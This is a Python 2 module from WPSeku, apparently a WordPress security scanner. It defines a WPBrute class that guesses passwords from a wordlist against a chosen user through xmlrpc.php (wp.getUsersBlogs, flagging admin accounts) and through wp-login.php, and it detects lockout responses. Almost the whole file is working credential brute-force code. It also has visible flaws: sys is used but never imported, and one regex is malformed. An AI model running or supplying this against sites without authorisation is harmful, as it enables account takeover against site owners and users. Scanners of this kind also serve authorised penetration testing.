 #!/usr/bin/env python 
# -*- coding:utf-8 -*- 
# WPSeku - Wordpress Security Scanner 
# Coded by Momo Outaadi (M4ll0k) (C) 2017

from core.lib import wp_checker
from core.lib import wp_colors
from core.lib import wp_print
from core.lib import wp_request
import re
import urllib

class WPBrute:
	"""Bruteforcing login"""
	check_ = wp_checker.WPChecker()
	print_ = wp_print.WPPrint()
	####
	def __init__(self,agent,proxy,redirect,url,cookie,wordlist,user):
		self.url = url
		self.cookie = cookie
		self.wordlist = wordlist
		self.user = user
		# request
		self.req = wp_request.WPRequest(agent=agent,proxy=proxy,redir=redirect)

	def xmlrpc(self):
		"""Bruteforcing login via xmlrpc"""
		self.print_.aprint("Starting Bruteforce Login via xmlrpc...")
		print ""
		#### 
		lista = open(self.wordlist,"rb")
		for pwd in lista:
			data = ("<methodCall><methodName>wp.getUsersBlogs</methodName><params>"
			"<param><value><string>"+self.user+"</string></value></param>"
			"<param><value><string>"+pwd.split("\n")[0]+"</string></value></param></params></methodCall>")
			self.print_.dprint("Trying Credentials: \"%s\" - \"%s\""%(self.user,pwd.split("\n")[0]))
			try:
				# check url
				url = self.check_.check(self.url,"/xmlrpc.php")
				# return results,url,code and headers
				html,uri,code,info = self.req.Send(url,"POST",data)
				####
				if re.search('<name>isAdmin</name><value><boolean>0</boolean>',html):
					self.print_.dprint("Valid Credentials: \"%s\" - \"%s\"\n"%(self.user,pwd.split("\n")[0]))
					sys.exit()
				####
				elif re.search('<name>isAdmin</name><value><boolean>1</boolean>',html):
					self.print_.dprint("Valid ADMIN Credentials: \"%s\" - \"%s\""%(self.user,pwd.split("\n")[0]))
			except Exception,e:
				pass
		sys.exit()

	def wplogin(self):
		"""Bruteforcing login"""
		self.print_.aprint("Starting Bruteforce Login via wp-login...")
		print ""
		lista = open(self.wordlist,"rb")
		for pwd in lista:
			# data
			query = {"log":self.user,"pwd":pwd.split("\n")[0],"wp-submit":"Log+In"}
			# encode data
			data = urllib.urlencode(query)
			self.print_.dprint("Trying Credentials: \"%s\" - \"%s\""%(self.user,pwd.split("\n")[0]))
			try:
				url = self.check_.check(self.url,"/wp-login.php")
				# return results,url,code and headers
				html,uri,code,info = self.req.Send(url,"POST",data)
				######
				if re.search('<strong>ERROR</strong>: Invalid username',html):
					sys.exit(self.print_.eprint("Invalid Username: "+self.user))
				######
				if re.search('<strong>(.+?e</strong> is incorrect.',html):
					sys.exit(self.print_.eprint("Invalid Password"))				
				#####
				if re.search('ERROR.*block.*',html,re.I):
					sys.exit(self.print_.eprint("Account Lockout Enabled: Your IP address has been temporary blocked"))
				#######
				if re.search('dashboard',html,re.I):
					sys.exit(self.print_.aprint("Valid Credentials: \"%s\" - \"%s\""%(self.user,pwd.split("\n")[0])))
			except Exception,e:
				pass
		sys.exit()


